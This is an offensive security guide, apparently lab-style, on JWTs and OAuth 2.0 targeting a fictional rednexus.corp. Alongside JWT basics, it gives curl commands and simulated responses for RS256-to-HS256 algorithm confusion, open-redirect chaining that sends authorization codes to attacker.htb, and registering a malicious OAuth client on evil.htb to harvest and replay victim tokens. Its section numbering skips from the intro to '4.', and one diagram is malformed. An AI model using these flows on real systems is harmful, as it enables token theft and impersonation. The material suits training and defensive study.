## Introduction to JWTs & OAuth

JSON Web Tokens (JWT) and OAuth 2.0 form the backbone of modern authentication and authorization in web applications, APIs, and microservices. Understanding their architecture, claim structures, and cryptographic flows is essential before executing advanced exploitation techniques. This guide provides a complete offensive deep dive into JWT manipulation, signature bypasses, secret recovery, algorithm confusion, header injection, and OAuth flow abuse — focusing purely on exploitation, tooling, and real-world attack patterns against `rednexus.corp`.

## JWT Fundamentals

### What is a JWT?

A JWT is a compact, URL-safe token format used to transmit claims between parties. It can be secured using **JSON Web Signature (JWS)** or **JSON Web Encryption (JWE)**. In practice, JWS dominates web applications. JWTs rely on two supporting standards:
- **JWK (JSON Web Key)**: Defines JSON structure for cryptographic keys
- **JWA (JSON Web Algorithm)**: Defines cryptographic algorithms for signing/verification

A JWT consists of three base64url-encoded parts separated by dots:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJyZWRuZXh1cy5jb3JwIiwidXNlciI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0.Chnhj-ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA
```

### JWT Structure Breakdown

```mermaid
graph LR
    A[Header<br/>alg: HS256<br/>typ: JWT] -->|base64url| D[JWT Token]
    B[Payload<br/>iss: rednexus.corp<br/>user: admin<br/>isAdmin: true] -->|base64url| D
    C[Signature<br/>HMACSHA256<br/>Header.Payload + Secret] -->|base64url| D
    D --> E[Sent in Cookie/Authorization Header]

    style A fill:#3498db,stroke:#2980b9,color:#fff
    style B fill:#2ecc71,stroke:#27ae60,color:#fff
    style C fill:#e74c3c,stroke:#c0392b,color:#fff
    style D fill:#f39c12,stroke:#e67e22,color:#fff
    style E fill:#9b59b6,stroke:#8e44ad,color:#fff
```

#### Header
Contains metadata about the token. Decoded example:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
| `alg` Value | Algorithm |
|-------------|-----------|
| HS256/384/512 | HMAC-SHA |
| RS256/384/512 | RSASSA-PKCS1-v1_5 |
| ES256/384/512 | ECDSA |
| PS256/384/512 | RSASSA-PSS |
| none | No signature |

#### Payload
Contains claims (registered, public, private). Decoded example:
```json
{
  "iss": "rednexus.corp",
  "user": "admin",
  "isAdmin": true,
  "exp": 1711186044
}
```
Common claims: `iss`, `sub`, `aud`, `exp`, `nbf`, `iat`, `jti`

#### Signature
Computed as:
```text
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```
The signature ensures integrity. Any modification to header/payload invalidates it unless the secret is known or verification is bypassed.

## Stateless vs Stateful Authentication

```mermaid
sequenceDiagram
    participant U as User
    participant S as Server
    participant DB as Session Store

    Note over U,DB: Stateful (Traditional)
    U->>S: POST /login (creds)
    S->>DB: Create session 4EC72A4BFF14A8CB
    S-->>U: Set-Cookie: session=4EC72A4BFF14A8CB
    U->>S: GET /dashboard (Cookie)
    S->>DB: Lookup session data
    DB-->>S: user=admin, role=super
    S-->>U: 200 OK

    Note over U,S: Stateless (JWT)
    U->>S: POST /login (creds)
    S->>S: Sign JWT with secret
    S-->>U: Set-Cookie: session=eyJhbGc...
    U->>S: GET /dashboard (Cookie)
    S->>S: Verify signature + decode claims
    S-->>U: 200 OK (role=admin)
```
JWT-based auth removes server-side session storage. The token carries all state, making it scalable but shifting security responsibility to signature verification and claim validation.

### 4. Algorithm Confusion (RS256 → HS256)

Servers using asymmetric crypto (RS256) often expose public keys. If `alg` isn't pinned, attackers can switch to HS256 and sign with the public key as the HMAC secret.

**Attack Flow:**
```mermaid

    participant A as Attacker
    participant S as Server
    A->>A: Obtain 2+ RS256 JWTs
    A->>A: Extract RSA public key
    A->>A: Change alg to HS256
    A->>A: Sign payload with public key
    A->>S: Send forged token
    S->>S: Uses public key for HS256 verification
    S-->>A: Signature matches → Access Granted
```

### Authorization Code Grant vs Implicit Grant

| Feature | Authorization Code | Implicit |
|---------|-------------------|----------|
| Security | High (code exchange) | Low (token in URL) |
| Token Exposure | Server-side | Browser/JS |
| Use Case | Web apps, APIs | SPAs, mobile apps |
| `response_type` | `code` | `token` |
| Modern Status | Recommended | Deprecated in OAuth 2.1 |

### 5. Open Redirect Chaining

Even with strict `redirect_uri` validation, open redirects on the client domain can be chained.

**Attack Flow:**
```mermaid
graph LR
    A[AS validates redirect_uri] --> B[Matches academy.rednexus.corp]
    B --> C[Redirects to academy.rednexus.corp/redirect?url=attacker.htb]
    C --> D[Open redirect forwards to attacker]
    D --> E[Attacker captures code]
    E --> F[Token theft]
    style E fill:#c0392b,stroke:#922b21,color:#fff
```

**Exploitation:**
```bash
curl -i "https://hubgit.rednexus.corp/authorization/auth?response_type=code&client_id=1337&redirect_uri=https://academy.rednexus.corp/redirect?url=https://attacker.htb/callback&state=xyz"
```

**Output:**
```http
HTTP/1.1 303 See Other
Location: https://academy.rednexus.corp/redirect?url=https://attacker.htb/callback?code=CAPTURED_CODE&state=xyz
```
Victim authenticates → AS redirects to academy.rednexus.corp/redirect → Open redirect forwards to attacker.htb/callback → Attacker receives code → Exchanges for token.

### 6. Malicious Client Abuse

Attackers register their own OAuth client to harvest victim tokens.

**Exploitation:**
```bash
curl -i -X POST "https://hubgit.rednexus.corp/oauth/register" \
  -H "Content-Type: application/json" \
  -d '{"client_name":"evil.htb","redirect_uris":["https://evil.htb/callback"]}'
```

**Output:**
```http
HTTP/1.1 201 Created
Server: nginx/1.24.0
Content-Type: application/json
Content-Length: 84

{"client_id":"evil123","client_secret":"sec456","status":"registered"}
```

**Victim logs into evil.htb via HubGit OAuth:**
```bash
curl -i -X GET "https://hubgit.rednexus.corp/authorization/auth?response_type=code&client_id=evil123&redirect_uri=https://evil.htb/callback&state=xyz"
```

**Output:**
```http
HTTP/1.1 303 See Other
Location: https://evil.htb/callback?code=VICTIM_CODE_HARVESTED&state=xyz
```

**Attacker replays token on academy.rednexus.corp:**
```bash
curl -i -X GET "https://academy.rednexus.corp/api/profile" \
  -H "Authorization: Bearer VICTIM_TOKEN_EXCHANGED"
```

**Output:**
```http
HTTP/1.1 200 OK
Server: nginx/1.24.0
Content-Type: application/json
Content-Length: 95

{"username":"htb-stdnt","email":"student@hubgit.rednexus.corp","role":"user","message":"Cross-client token reuse successful."}
```
Cross-client token reuse enables impersonation.
